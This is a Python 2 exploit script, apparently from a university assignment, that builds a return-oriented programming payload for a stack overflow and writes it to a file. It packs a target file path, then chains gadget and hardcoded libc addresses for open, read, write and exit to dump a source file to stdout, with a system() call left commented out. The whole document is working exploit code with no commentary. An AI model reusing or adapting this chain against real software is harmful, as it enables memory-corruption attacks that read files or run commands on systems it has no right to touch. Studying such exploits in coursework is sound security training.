import sys
def pack64(n):
	s = ""
	while n:
		s += chr(n % 0x100)
		n = n / 0x100
	s = s.ljust(8, "\x00")
	return s

f = open("./exploit", "w")

buffer_address = 0x7fffffffddd0

offset = int(input(""))

buffer_address += offset
print("buffer @" + hex(buffer_address) + "offset = " + str(offset))

payload = ""
#632e706f722f 706f722f32612f70 6f746b7365442f7e
#632e 706f722f706f722f 32612f706f746b73 65442f746e656475 74732f656d6f682f
payload += pack64(0x632e706f722f2e) #./rop.c
payload += pack64(0x65442f746e656475)
payload += pack64(0x32612f706f746b73)
payload += pack64(0x706f722f706f722f)
payload += pack64(0x632e)
payload = payload.ljust(56, "\x00")
#open file open(./rop, 0)
payload += pack64(0x004008c3) #pop rdi
payload += pack64(buffer_address) #./rop.c @base address of bufs
payload += pack64(0x004008c1) #pop rsi, pop 15
payload += pack64(0x0) #0
payload += pack64(0x7fffffffddd0) #randomvalue
payload += pack64(0x7ffff7b040f0) #open

#read file read(0x03, bufferloc,
payload += pack64(0x004008c3) #pop rdi
payload += pack64(0x03)
payload += pack64(0x004008c1) #pop rsi, pop 15
payload += pack64(0x7fffffffcdf0) #bufferlocation
payload += pack64(0x7fffffffddd0) #randomvalue
payload += pack64(0x00007ffff7a0eb96) #pop rdx
payload += pack64(0x1000)
payload += pack64(0x7ffff7b04310) # read

#write to sysout write(0x01, bufferloc,
payload += pack64(0x004008c3) #pop rdi
payload += pack64(0x01)
payload += pack64(0x004008c1) #pop rsi, pop 15
payload += pack64(0x7fffffffcdf0) #bufferlocation
payload += pack64(0x7fffffffddd0) #randomvalue
payload += pack64(0x00007ffff7a0eb96) #pop rdx
payload += pack64(0x1000)
payload += pack64(0x7ffff7b04370) # write

payload += pack64(0x7ffff7a47040) #exit
#payload += pack64(0x7ffff7a523a0) #system
#payload += pack64(0x004008c3) #pop rdi
#payload += pack64(0x004008c1) #pop rsi



f.write(payload)
f.close()

